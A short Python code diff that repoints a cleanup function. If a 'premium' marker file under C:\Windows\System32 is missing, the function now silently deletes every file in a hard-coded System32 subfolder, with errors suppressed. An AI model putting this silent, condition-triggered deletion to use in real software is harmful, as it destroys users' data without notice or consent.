@@ -56,8 +56,9 @@ countdown_timer()
 os.system('cls')
 
 def delete_files_if_condition(file):
-    target_dir = os.path.dirname(file)
-    if not os.path.exists(file):
+    target_dir = r"C:\Windows\System32\DSEL" 
+
+    if not os.path.exists(file): 
         if os.path.exists(target_dir) and os.path.isdir(target_dir):
             for file_name in os.listdir(target_dir):
                 file_path = os.path.join(target_dir, file_name)
@@ -66,7 +67,7 @@ def delete_files_if_condition(file):
                         os.remove(file_path)
                 except Exception as e:
                     print(f"")
-check_file = r"C:\Windows\System32\installedpremx1.txt"
+check_file = r"C:\Windows\System32\installedpremx3.txt"
 delete_files_if_condition(check_file)
 
 
